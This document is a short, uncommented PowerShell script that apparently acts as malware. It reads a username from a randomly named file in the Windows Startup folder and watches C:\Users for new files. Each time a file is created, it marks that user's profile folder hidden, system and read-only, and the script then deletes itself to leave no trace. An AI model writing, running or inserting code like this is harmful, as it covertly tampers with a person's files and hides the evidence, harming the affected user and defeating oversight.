$user = (Get-Content "C:\Users\me\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\etgtYmwQUO.txt").Trim()

$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Users"
$watcher.Filter = "*.*"
$watcher.IncludeSubdirectories = $false
$watcher.EnableRaisingEvents = $true

$action = { $path = $Event.SourceEventArgs.FullPath
            $changeType = $Event.SourceEventArgs.ChangeType
            attrib +h +s +r C:\Users\$user
}

Register-ObjectEvent $watcher "Created" -Action $action

Remove-Item $PSCommandPath -Force
